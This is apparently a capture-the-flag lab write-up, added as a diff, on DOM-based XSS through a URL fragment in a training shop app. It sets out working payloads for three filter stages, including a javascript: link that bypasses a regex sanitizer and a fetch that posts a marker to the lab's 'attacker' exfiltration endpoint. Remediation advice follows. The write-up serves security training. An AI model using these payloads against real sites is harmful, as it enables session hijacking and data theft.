@@ -1716,3 +1716,340 @@ FLAG{d4b938b857e1527252b213ae3ba6f364}
 ```
 
 The central security lesson is that Markdown is not inherently safe. Security depends on how the Markdown is converted, sanitized, stored, and inserted into the final HTML document. Even a stricter sanitizer can exhibit inconsistent behavior if HTML parsing, entity decoding, and URL validation are not handled coherently.
+
+
+
+
+## Task 5: DOM XSS - URL Hash Hijack
+
+### Vulnerability Description
+
+A DOM-based Cross-Site Scripting (XSS) vulnerability was identified in the NexusShop product page's section-navigation feature. Client-side JavaScript reads the URL fragment from `location.hash`, decodes it, and inserts it into the page through `innerHTML`. Because the fragment is attacker-controlled, HTML supplied after `#` can be parsed into live DOM elements and execute JavaScript. URL fragments are not included in HTTP requests to the server, so server-side input filters and HTTP access logs do not see the payload.
+
+The challenge contains three progressively filtered stages. Stage 1 directly inserts the fragment into `innerHTML`; Stage 2 is described as removing `<script>` elements but still permits executable HTML event handlers; Stage 3 replaces event-handler attributes matching a regular expression, yet fails to prohibit `javascript:` URLs. We confirmed JavaScript execution in all three stages, C2 communication from Stage 3 using a synthetic marker, and flag capture triggered by the Stage 3 DOM XSS payload.
+
+### Location & Parameters
+
+| Attribute | Details |
+|-----------|---------|
+| **Application** | NexusShop |
+| **Base URL** | `http://web0x0c.hbtn` |
+| **Stage 1 URL** | `/product/1#PAYLOAD` |
+| **Stage 2 URL** | `/product/1/gallery#PAYLOAD` |
+| **Stage 3 URL** | `/product/1/specs#PAYLOAD` |
+| **Parameter/Field** | URL fragment (`location.hash`, after `#`) |
+| **Source** | `decodeURIComponent(location.hash.slice(1))` |
+| **Sink** | `document.getElementById('section-title').innerHTML` |
+| **Type** | DOM-based XSS |
+| **Severity** | **High** (confirmed script execution; Stage 3 payload requires a click) |
+| **Challenge Context** | Level 7, Stage 3 (confirmed by C2 labeling) |
+| **C2 Endpoint** | `POST /attacker/api/exfil` |
+| **Tracking Endpoint** | `GET /product/api/track?t=...` |
+| **Flag File** | `web_application_security/websec_0x0C/6-flag.txt` |
+
+### Attack Vector
+
+**1. Confirm that the URL fragment enters the DOM**
+
+Open:
+
+```text
+http://web0x0c.hbtn/product/1#HASH_STAGE1_PROBE
+```
+
+Firefox Inspector shows the marker inside the page's section title:
+
+```html
+<h3 id="section-title" class="text-xl font-bold mb-4">
+    HASH_STAGE1_PROBE
+</h3>
+```
+
+The fragment is handled client-side, rather than transmitted as part of the HTTP request path.
+
+**2. Identify the source-to-sink flow**
+
+The Stage 1 `loadSection()` function contains:
+
+```javascript
+function loadSection() {
+    const hash = decodeURIComponent(location.hash.slice(1)) || 'overview';
+
+    // Stage 1: No filter
+    document.getElementById('section-title').innerHTML =
+        hash.charAt(0).toUpperCase() + hash.slice(1);
+
+    // The function also selects predetermined section content.
+}
+```
+
+`location.hash` is the untrusted **source**. `decodeURIComponent()` converts any URL-encoded characters. The resulting string is assigned to `innerHTML`, an HTML-parsing **sink**. Capitalizing the first character does not sanitize the fragment. The separate assignment to `section-content` uses predefined strings selected from a fixed lookup table; the confirmed injection point is `section-title`.
+
+**3. Stage 1: Confirm HTML injection and JavaScript execution**
+
+A harmless probe was submitted through the browser Console:
+
+```javascript
+location.hash = encodeURIComponent('<b id="dom-stage1-probe">STAGE1_HTML_OK</b>');
+```
+
+Firefox rendered a genuine `<b>` element inside `section-title`, demonstrating HTML interpretation. The following payload then confirmed JavaScript execution:
+
+```javascript
+location.hash = encodeURIComponent(
+    `<img src=x onerror="console.log('DOM_STAGE1_XSS_EXECUTED')">`
+);
+```
+
+Observed Console output:
+
+```text
+DOM_STAGE1_XSS_EXECUTED
+```
+
+Observed DOM:
+
+```html
+<h3 id="section-title" class="text-xl font-bold mb-4">
+    <img src="x" onerror="console.log('DOM_STAGE1_XSS_EXECUTED')">
+</h3>
+```
+
+The invalid image resource triggers `onerror`, which executes without a user click. **Stage 1 DOM XSS confirmed.**
+
+**4. Stage 2: Demonstrate that script-tag filtering does not prevent event-handler execution**
+
+Navigate to `/product/1/gallery` and execute:
+
+```javascript
+location.hash = encodeURIComponent(
+    `<img src=x onerror="console.log('DOM_STAGE2_XSS_EXECUTED')">`
+);
+```
+
+The Console displays:
+
+```text
+DOM_STAGE2_XSS_EXECUTED
+```
+
+Inspector shows an actual `<img>` element with `onerror` intact. **Stage 2 DOM XSS confirmed.** This verifies that executable event-handler markup survives; the challenge describes a script-removal filter, but we did not separately test its exact treatment of `<script>` elements.
+
+**5. Stage 3: Inspect the event-handler filter**
+
+Navigate to `/product/1/specs`. The Stage 1-style image payload does not execute. Inspector shows:
+
+```html
+<h3 id="section-title" class="text-xl font-bold mb-4">
+    <img src="x" data-blocked="console.log('DOM_STAGE3_XSS_EXECUTED')">
+</h3>
+```
+
+The Stage 3 source contains:
+
+```javascript
+let safeHash = hash.replace(/<script[^>]*>.*?<\/script>/gi, '')
+                   .replace(/on\w+\s*=/gi, 'data-blocked=');
+document.getElementById('section-title').innerHTML =
+    safeHash.charAt(0).toUpperCase() + safeHash.slice(1);
+```
+
+The second regular expression rewrites attributes such as `onerror=` to `data-blocked=`. However, these two expressions do not validate URL protocols, and the result still enters `innerHTML`.
+
+**6. Stage 3: Bypass the filter with a `javascript:` link**
+
+Execute:
+
+```javascript
+location.hash = encodeURIComponent(
+    `<a href="javascript:console.log('DOM_STAGE3_LINK_EXECUTED')">CLICK_TO_TEST_XSS</a>`
+);
+```
+
+Inspector shows:
+
+```html
+<h3 id="section-title" class="text-xl font-bold mb-4">
+    <a href="javascript:console.log('DOM_STAGE3_LINK_EXECUTED')">
+        CLICK_TO_TEST_XSS
+    </a>
+</h3>
+```
+
+Clicking `CLICK_TO_TEST_XSS` produces:
+
+```text
+DOM_STAGE3_LINK_EXECUTED
+```
+
+**Stage 3 DOM XSS confirmed.** This bypass uses neither `<script>` elements nor `on...=` event attributes, so neither regular expression removes it. **Unlike Stages 1 and 2, the tested Stage 3 exploit requires a click.**
+
+**7. Verify C2 communication from the Stage 3 payload**
+
+Inject a link through `location.hash` that sends a synthetic proof marker to the lab's C2 endpoint:
+
+```javascript
+location.hash = encodeURIComponent(
+    `<a href="javascript:fetch('/attacker/api/exfil',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'cookies',data:'DOM_STAGE3_C2_PROOF',level:7,stage:3})}).then(r=>console.log('C2_STATUS:',r.status))">SEND_C2_TEST</a>`
+);
+```
+
+After clicking the injected link, Firefox logs:
+
+```text
+C2_STATUS: 200
+```
+
+The C2 dashboard at `/attacker` displays:
+
+```text
+COOKIES: Level 7 / Stage 3 • 2026-11-01 15:55:35
+DOM_STAGE3_C2_PROOF
+```
+
+The dashboard categorizes the submission under **Cookies**, but the payload sent a **synthetic marker**, not a real cookie or credential. This verifies outbound C2 communication without claiming actual data theft.
+
+**8. Identify the tracking endpoint**
+
+A request to `/product/hash/api/track?t=test` returned `404`. A subsequent endpoint test established that:
+
+```http
+GET /product/api/track?t=test
+```
+
+returns:
+
+```json
+{"status":"error"}
+```
+
+with HTTP `200 OK`, confirming the endpoint exists and rejects an invalid token.
+
+**9. Capture the Stage 3 flag through the DOM XSS link**
+
+Inject the final link into the fragment:
+
+```javascript
+location.hash = encodeURIComponent(
+    `<a href="javascript:fetch('/product/api/track?t='+encodeURIComponent(document.getElementById('tracking-id').textContent.trim())).then(r=>r.text()).then(t=>console.log('TRACK_RESULT:',t))">CAPTURE_STAGE3_FLAG</a>`
+);
+```
+
+Click `CAPTURE_STAGE3_FLAG` in the section title. The link reads the hidden DOM tracking token and submits it using the active browser session. The Console reports:
+
+```json
+TRACK_RESULT: {"ref":"FLAG{f10480356860a010a1f2c403cf62ee41}","status":"tracked"}
+```
+
+**Result: Stage 3 flag captured through the verified DOM XSS execution path**, not through a separate manual tracking request.
+
+### Payload Used
+
+**Stage 1, automatic execution:**
+
+```html
+<img src=x onerror="console.log('DOM_STAGE1_XSS_EXECUTED')">
+```
+
+**Stage 2, automatic execution:**
+
+```html
+<img src=x onerror="console.log('DOM_STAGE2_XSS_EXECUTED')">
+```
+
+**Stage 3, interactive sanitizer bypass:**
+
+```html
+<a href="javascript:console.log('DOM_STAGE3_LINK_EXECUTED')">CLICK_TO_TEST_XSS</a>
+```
+
+**Stage 3, C2 proof payload (synthetic marker):**
+
+```html
+<a href="javascript:fetch('/attacker/api/exfil',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'cookies',data:'DOM_STAGE3_C2_PROOF',level:7,stage:3})}).then(r=>console.log('C2_STATUS:',r.status))">SEND_C2_TEST</a>
+```
+
+**Final Stage 3 flag-capture payload:**
+
+```html
+<a href="javascript:fetch('/product/api/track?t='+encodeURIComponent(document.getElementById('tracking-id').textContent.trim())).then(r=>r.text()).then(t=>console.log('TRACK_RESULT:',t))">CAPTURE_STAGE3_FLAG</a>
+```
+
+Each HTML payload was placed into the URL fragment using `location.hash = encodeURIComponent(payload)`.
+
+### Evidence
+
+| Verification | Observed result |
+|-------------|-----------------|
+| Stage 1 source-to-sink | `location.hash` decoded and assigned to `section-title.innerHTML` |
+| Stage 1 execution | `DOM_STAGE1_XSS_EXECUTED` in Console; `<img onerror>` in DOM |
+| Stage 2 execution | `DOM_STAGE2_XSS_EXECUTED` in Console; `<img onerror>` in DOM |
+| Stage 3 original image payload | `onerror` transformed into `data-blocked`; no execution |
+| Stage 3 filter bypass | `<a href="javascript:...">` survives and executes after click |
+| C2 HTTP response | `C2_STATUS: 200` |
+| C2 dashboard | Level 7 / Stage 3 record containing `DOM_STAGE3_C2_PROOF` |
+| Tracking endpoint | `/product/api/track` accepts the valid token |
+| Flag response | `{"ref":"FLAG{f10480356860a010a1f2c403cf62ee41}","status":"tracked"}` |
+
+The defining characteristic of this attack is that the fragment after `#` stays in the browser: a server request for the page does not contain the payload. The source-to-sink analysis supports this behavior, although a separate screenshot of Network traffic excluding the fragment was not collected.
+
+**Captured flag:**
+
+```text
+FLAG{f10480356860a010a1f2c403cf62ee41}
+```
+
+**Required file:** `web_application_security/websec_0x0C/6-flag.txt`
+
+```text
+f10480356860a010a1f2c403cf62ee41
+```
+
+The user confirmed that the flag file was saved successfully.
+
+### Real-World Impact
+
+An attacker can create a link to a legitimate product page with a malicious URL fragment. When a user opens the link, vulnerable JavaScript reads the fragment and inserts it into the page as executable HTML, even though the server never receives the fragment in the HTTP request.
+
+Stages 1 and 2 demonstrate automatic JavaScript execution when the fragment is processed. Stage 3 demonstrates click-triggered execution through an injected `javascript:` link. Depending on the privileges and accessible data in the victim's browser, a real exploit could modify page content, initiate same-origin requests in the user's session, read JavaScript-accessible tokens or application data, or transmit accessible data to an attacker-controlled endpoint. Cookies marked `HttpOnly` cannot be read directly through JavaScript.
+
+Server-side filtering alone cannot remove a fragment it never receives. Consequently, the application must enforce trust boundaries when handling client-side URL data. The C2 test demonstrated the ability to transmit a synthetic marker; it did not demonstrate theft of actual cookies or credentials.
+
+### Remediation
+
+**1. Eliminate `innerHTML` for the section title.** The title is plain text and should be rendered with `textContent`:
+
+```javascript
+const requested = decodeURIComponent(location.hash.slice(1)) || 'overview';
+const allowed = new Set(['overview', 'specs', 'reviews']);
+const section = allowed.has(requested) ? requested : 'overview';
+
+document.getElementById('section-title').textContent =
+    section.charAt(0).toUpperCase() + section.slice(1);
+```
+
+Handle malformed percent-encoding with `try/catch` in production to avoid exceptions from `decodeURIComponent`.
+
+**2. Restrict fragments to known section identifiers.** If the application only supports `overview`, `specs`, and `reviews`, reject arbitrary fragment values before updating the UI. This prevents the hash from acting as an unrestricted display or markup input.
+
+**3. Do not rely on regular-expression HTML sanitization.** Stage 3's filters remove some `<script>` patterns and rewrite event attributes but completely miss `javascript:` links. If rich HTML is actually required, use a maintained allowlist-based HTML sanitizer and explicitly restrict URL schemes to those needed, such as `https:` and `http:`.
+
+**4. Enforce a restrictive Content Security Policy.** A policy that blocks inline script execution, including `javascript:` navigation, provides defense in depth. For example, after adapting any legitimate inline scripts:
+
+```http
+Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self'
+```
+
+**5. Test the final DOM and browser execution path.** Automated regression tests should cover hash changes without page reloads, encoded fragments, raw HTML elements, event handlers, and `javascript:` URLs. Inspect whether the browser creates executable elements and whether any unexpected network request follows.
+
+**6. Keep trusted and untrusted content separate.** The predefined `section-content` strings can be managed as trusted templates, but any dynamically supplied user text should be inserted using `textContent` or equivalent safe DOM APIs rather than concatenated into HTML.
+
+### Conclusion
+
+Task 5 confirmed DOM-based XSS in all three challenge stages. Stage 1 directly parses the URL fragment as HTML. Stage 2 retains executable image event handlers despite its stated script-filtering behavior. Stage 3 blocks common event-handler attributes, but its regular expressions fail to reject `javascript:` URLs, allowing execution through a clickable link.
+
+The Stage 3 exploit successfully sent a synthetic marker to the lab C2 dashboard and captured the flag by executing the tracking request through the injected DOM link.
+
+**Final flag:** `FLAG{f10480356860a010a1f2c403cf62ee41}`
+
+**Core lesson:** Client-controlled URL fragments are untrusted input. They must not be passed into HTML-parsing sinks, and filtering individual dangerous strings cannot replace context-appropriate DOM APIs and robust URL validation.
